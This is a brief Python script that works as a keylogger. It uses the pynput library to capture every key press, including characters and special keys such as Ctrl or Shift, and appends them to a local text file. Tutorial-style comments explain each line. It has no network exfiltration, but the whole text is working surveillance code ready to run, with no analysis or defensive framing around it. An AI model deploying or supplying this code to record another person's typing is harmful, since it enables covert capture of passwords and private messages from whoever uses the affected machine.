from pynput import keyboard

log_file = "keystrokes_saved.txt" #The file where all the logged key presses will be saved

def on_key_press(key):
    try:
        with open(log_file, 'a') as f: #Open the file in append mode ('a') so new key presses are added to the file without overwriting existing content.
            if hasattr(key, 'char') and key.char: #Check if the key object has a 'char' attribute and ensure it contains a valid value. Ex.: a, b, 1, 2,etc.
                f.write(f"{key.char}\n") #Write the character to the file, followed by a new line 
            else:
                f.write(f"{key}\n") #This writes special key strocks like Ctrl or Shift on the file 
    
    except Exception as e: #Print an error message if something goes wrong while logging the key press
        print(f"Error logging key press: {e}")

with keyboard.Listener(on_press=on_key_press) as listener: #Set up and start a keyboard listener using the pynput library to monitor key presses
    listener.join() #Keep the listener running to capture key presses until the program is stopped
